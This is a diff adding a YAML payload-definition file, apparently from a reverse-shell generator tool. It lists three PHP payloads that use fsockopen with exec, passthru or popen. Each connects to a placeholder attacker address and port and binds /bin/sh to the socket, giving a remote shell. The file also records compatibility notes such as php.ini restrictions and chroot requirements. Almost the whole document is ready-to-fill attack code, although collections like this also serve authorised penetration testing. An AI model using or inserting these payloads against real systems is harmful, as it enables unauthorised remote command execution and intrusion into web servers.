@@ -1,0 +1,83 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: revshell
+  version: 0.0.1
+
+
+###
+### Items
+###
+items:
+
+  - name: php-fsockopen-exec
+    desc: description
+    info:
+      - If the webserver runs in a chroot, it requires /bin/sh to be present in that chroot too.
+      - exec() might be disabled via php.ini
+    rating: 1
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: ["sh"]                      # Used shell commands
+        functions: ["fsockopen", "exec"]      # Used language functions
+        modules: []                           # Used language modules
+        os: ["bsd", "linux", "mac"]           # Works on these operating systems
+    revshell:
+      proto: tcp
+      shell: sh
+      command: "/bin/sh"
+    payload: |
+      $s=fsockopen("__ADDR__",__PORT__);
+      exec("/bin/sh<&3 >&3 2>&3");
+
+
+  - name: php-fsockopen-passthru
+    desc: description
+    info:
+      - If the webserver runs in a chroot, it requires /bin/sh to be present in that chroot too.
+      - passthru() might be disabled via php.ini
+    rating: 1
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: ["sh"]                      # Used shell commands
+        functions: ["fsockopen", "passthru"]  # Used language functions
+        modules: []                           # Used language modules
+        os: ["bsd", "linux", "mac"]           # Works on these operating systems
+    revshell:
+      proto: tcp
+      shell: sh
+      command: "/bin/sh"
+    payload: |
+      $s=fsockopen("__ADDR__",__PORT__);
+      passthru("/bin/sh<&3 >&3 2>&3");
+
+
+  - name: php-fsockopen-popen
+    desc: description
+    info:
+      - If the webserver runs in a chroot, it requires /bin/sh to be present in that chroot too.
+      - popen() might be disabled via php.ini
+    rating: 1
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: ["sh"]                      # Used shell commands
+        functions: ["fsockopen", "popen"]
+        modules: []
+        os: ["bsd", "linux", "mac"]           # Works on these operating systems
+    revshell:
+      proto: tcp
+      shell: sh
+      command: "/bin/sh"
+    payload: |
+      $s=fsockopen("__ADDR__",__PORT__);
+      popen("/bin/sh<&3 >&3 2>&3","r");
